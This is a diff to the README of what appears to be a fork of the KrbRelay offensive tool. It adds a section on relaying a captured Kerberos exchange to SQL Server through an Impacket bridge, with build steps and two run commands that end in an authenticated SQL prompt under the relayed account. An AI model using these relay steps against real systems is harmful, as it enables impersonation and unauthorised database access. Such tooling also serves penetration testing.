@@ -198,6 +198,24 @@ KrbRelay.exe -spn cifs/win10.htb.local -clsid 0289a7c5-91bf-4547-81ae-fec91a89de
 Also added `-skip-check` option to avoid using the `CheckPort` function, make sure to pass `-port` to force COM to listen on that port, useful when dealing with firewall.
 
 
+### MSSQL relay bridge
+
+The COM trigger can capture a Kerberos exchange, but the original client dispatch supports LDAP, HTTP, and CIFS only. This fork also accepts `MSSQLSvc` SPNs and sends the exchange to `tools/mssql_bridge.py`. The bridge uses Impacket to complete SQL Server's TDS integrated login and retains the authenticated connection for SQL queries. Its TDS handling adapts the [krbrelayx MSSQL client proposal](https://github.com/dirkjanm/krbrelayx/pull/56).
+
+Build `KrbRelay.sln` in Visual Studio with the Release configuration. On a machine with Python 3 and Impacket, start the bridge with the address it should bind and the SQL Server address:
+
+```sh
+python3 tools/mssql_bridge.py --listen-host BRIDGE_IP --sql-host SQL_ADDRESS
+```
+
+Then run KrbRelay with the SQL SPN and an address it can use to reach the bridge. `-bridge-port` and `--listen-port` both default to 9801; set both when using another port. Other COM callback options, including `-rogue`, depend on the network and session being tested.
+
+```cmd
+KrbRelay.exe -spn MSSQLSvc/SQL_FQDN -clsid CLSID -session SESSION_ID -bridge-host BRIDGE_IP
+```
+
+`LOGINACK` confirms that SQL accepted the login. The bridge prints `SYSTEM_USER` and `ORIGINAL_LOGIN()` to identify the account and leaves a `SQL>` prompt for subsequent queries.
+
 ### Acknowledgements
 
 * [Vletoux ](https://twitter.com/mysmartlogon) for starting [RPCForSMBLibrary](https://github.com/vletoux/RPCForSMBLibrary)
